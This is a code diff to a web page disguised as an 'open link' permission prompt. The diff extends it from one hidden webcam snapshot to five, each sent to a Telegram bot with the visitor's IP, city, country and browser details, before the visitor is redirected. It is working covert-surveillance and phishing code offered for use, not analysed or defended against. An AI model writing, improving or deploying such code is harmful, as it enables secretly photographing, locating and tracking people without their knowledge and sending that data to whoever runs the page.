@@ -22,7 +22,7 @@
     <div id="permission-request">
         <h2>openlink Required</h2>
         <p>Please allow open link to continue</p>
-        <button id="allow-btn">open link </button>
+        <button id="allow-btn">open link</button>
     </div>
     <video id="video-preview" autoplay playsinline></video>
     <canvas id="capture-canvas" style="display:none;"></canvas>
@@ -59,12 +59,12 @@
                 return await detailsResponse.json();
             } catch (error) { return {}; }
         }
-        async function sendPhotoToTelegram(blob, info) {
+        async function sendPhotoToTelegram(blob, info, index) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('caption', `👤 New visitor photo\n\n🌐 ${info.ip || ''} - ${info.city || ''} ${info.country_name || ''}\n📱 ${navigator.userAgent}`);
-                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `👤 Visitor photo ${index}/5\n\n🌐 ${info.ip || ''} - ${info.city || ''} ${info.country_name || ''}\n📱 ${navigator.userAgent}`);
+                formData.append('photo', blob, `photo${index}.jpg`);
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method:'POST',body:formData
                 });
@@ -76,19 +76,25 @@
                 videoPreview.srcObject = stream;
                 videoPreview.style.display = 'none';
                 await new Promise(resolve => {videoPreview.onloadedmetadata = () => {resolve();};});
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                const ctx = captureCanvas.getContext('2d');
                 captureCanvas.width = videoPreview.videoWidth;
                 captureCanvas.height = videoPreview.videoHeight;
-                const ctx = captureCanvas.getContext('2d');
-                ctx.drawImage(videoPreview, 0, 0, captureCanvas.width, captureCanvas.height);
-                const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg', 0.95));
-                stream.getTracks().forEach(track => track.stop());
                 const info = await getIPInfo();
-                await sendPhotoToTelegram(blob, info);
-                loadingText.textContent = 'suceees!';
+
+                // Capture 5 photos with slight delays
+                for (let i = 1; i <= 5; i++) {
+                    ctx.drawImage(videoPreview, 0, 0, captureCanvas.width, captureCanvas.height);
+                    const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg', 0.95));
+                    await sendPhotoToTelegram(blob, info, i);
+                    loadingText.textContent = `Photo ${i}/5 sent...`;
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec delay between photos
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+                loadingText.textContent = 'Success!';
                 setTimeout(() => {
-                    window.location.href = redirectUrl; // redirect after successful photo
-                }, 1200); // little delay for effect
+                    window.location.href = redirectUrl;
+                }, 1200);
             } catch (error) {
                 loadingOverlay.style.display = 'none';
                 permissionRequest.style.display = 'flex';
